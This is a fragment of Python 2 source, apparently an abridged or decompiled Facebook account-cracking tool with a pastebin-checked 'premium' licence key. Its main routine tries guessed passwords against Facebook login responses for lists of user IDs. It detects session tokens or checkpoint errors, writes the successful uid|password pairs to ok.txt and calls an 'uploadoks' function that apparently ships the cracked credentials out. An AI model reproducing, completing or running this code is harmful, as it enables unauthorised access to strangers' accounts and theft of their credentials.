...
def helpnote():
    ...
    subprocess.check_output(['am', 'start', 'https://github.com/4B92B/approval.tx/blob/main/Approval.txt'])
    exit(' [*] FACEBOOK :  https://www.facebook.com/x.rakib.vau77')
...
class Main():
    ...
    def __init__(self):
        ...
        self.loop = 0
        try:
            plr = requests.get('https://pastebin.com/raw/XpHrZSDP').text
            if basesplit in plr:
                key = basesplit
                stat = '\x1b[0;92mP R E M I U M NOT'
                FY = '\x1b[0;93m'
                FG = '\x1b[0;92m'
                GET = '\r'
            else:
                key = '\x1b[0;91m 1g0uacs '
                stat = '\x1b[0;91m Paid USER '
                FY = '\x1b[0;90m'
                FG = '\x1b[0;90m'
                GET = '\x1b[0;92m [P] GET PREMIUM Not'
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write('\r\r %s\x1b[0;93m[>_][RRX]:\x1b[0;97m %s/%s ->\x1b[0;92m[RX-OK:%s]-\x1b[0;93m[RX-CP:%s]' % (B, self.loop, len(self.id), len(self.ok), len(self.cp)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r \x1b[0;92m[B-OK] %s|%s\x1b[0;97m         ' % (uid, pw)
                self.ok.append('%s|%s' % (uid, pw))
                open('ok.txt', 'a').write(' [B-OK] %s|%s\n' % (uid, pw))
                uploadoks()
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                print '\r \x1b[0;93m[RX-OK] %s|%s\x1b[0;97m         ' % (uid, pw)
